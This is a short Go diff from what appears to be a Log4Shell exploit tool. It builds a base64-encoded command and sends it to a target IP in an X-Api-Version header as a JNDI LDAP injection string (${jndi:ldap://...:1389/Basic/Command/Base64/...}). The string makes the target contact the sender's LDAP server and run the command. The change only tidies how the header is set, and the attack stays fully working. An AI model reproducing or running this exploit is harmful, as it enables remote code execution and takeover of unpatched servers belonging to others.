@@ -36,16 +36,8 @@ func PayloadInput() {
 			encodedpayloadcmd := base64.StdEncoding.EncodeToString([]byte(payloadcmd))
 			fmt.Println("Sending payload...")
 			targeturl := "http://" + targetip + ":" + targetport
-			// req, err := http.NewRequest("GET", targeturl, nil)
-			// req.Header.Add("X-Api-Version", "${jndi:ldap://"+sourceip.String()+":1389/Basic/Command/Base64/"+encodedpayloadcmd+"}")
-			// if err != nil {
-			// 	fmt.Println("Error:", err)
-			// 	return
-			// }
 			req, err := http.NewRequest("GET", targeturl, nil)
-			req.Header = http.Header{
-				"X-Api-Version": []string{"${jndi:ldap://" + sourceip.String() + ":1389/Basic/Command/Base64/" + encodedpayloadcmd + "}"},
-			}
+			req.Header.Add("X-Api-Version", "${jndi:ldap://"+sourceip.String()+":1389/Basic/Command/Base64/"+encodedpayloadcmd+"}")
 			if err != nil {
 				fmt.Println("Error:", err)
 				return
